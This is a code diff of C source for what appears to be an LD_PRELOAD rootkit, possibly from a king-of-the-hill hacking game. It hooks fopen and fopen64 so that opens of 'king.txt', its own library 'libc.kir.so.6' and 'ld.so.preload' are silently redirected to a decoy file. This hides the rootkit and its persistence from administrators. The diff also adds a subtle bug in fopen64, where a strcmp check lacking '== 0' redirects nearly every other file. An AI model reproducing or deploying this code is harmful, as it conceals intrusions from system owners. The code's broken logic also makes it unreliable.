@@ -83,18 +83,17 @@ FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *fopen(const char *pathname, const char *mode)
 {
 	FILE *fp;
+	char * trash = "kirtrash";
 	orig_fopen = dlsym(RTLD_NEXT, "fopen");
         if(strstr(pathname, "king.txt")) {
-                pathname = "kirtrash";
+                 pathname = trash;
         }
         else if(strstr(pathname, "libc.kir.so.6")) {
-                pathname = "kirtrash";
+                 pathname = trash;
         }
         else if(strstr(pathname, "ld.so.preload")) {
-                pathname = "kirtrash";
+                 pathname = trash;
         }
-
-	printf("%s", strstr(pathname, "king.txt"));
 	fp = orig_fopen(pathname, mode);
 	return(fp);
 }
@@ -103,17 +102,17 @@ FILE *(*orig_fopen64)(const char *pathname, const char *mode);
 FILE *fopen64(const char *pathname, const char *mode)
 {
 	FILE* fp;
+	char * trash = "kirtrash";
 	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
-        if(strstr(pathname, "king.txt")) {
-                pathname = "kirtrash";
+        if(strcmp(pathname, "king.txt")) {
+                 pathname = trash;
         }
-        else if(strstr(pathname, "libc.kir.so.6")) {
-                pathname = "kirtrash";
+        else if(strcmp(pathname, "libc.kir.so.6") == 0) {
+                 pathname = trash;
         }
-        else if(strstr(pathname, "ld.so.preload")) {
-                pathname = "kirtrash";
+        else if(strcmp(pathname, "ld.so.preload") == 0) {
+                 pathname = trash;
         }
-	printf("%s", strstr(pathname, "king.txt"));
-        fp = orig_fopen(pathname, mode);
+        fp = orig_fopen64(pathname, mode);
         return(fp);
 }
